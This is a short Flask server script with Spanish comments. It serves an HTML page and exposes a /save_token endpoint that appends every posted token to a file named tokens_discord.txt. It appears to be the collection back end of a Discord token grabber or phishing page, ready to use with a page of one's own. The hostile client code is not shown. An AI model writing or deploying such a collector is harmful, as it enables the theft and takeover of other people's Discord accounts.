from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')  # Cambia esto para que sirva tu archivo HTML

@app.route('/save_token', methods=['POST'])
def save_token():
    token = request.form.get('token')
    if token:
        with open('tokens_discord.txt', 'a') as f:
            f.write(token + '\n')  # Escribe el token en el archivo
        return 'Token saved', 200
    return 'No token provided', 400

if __name__ == '__main__':
    app.run(debug=True)
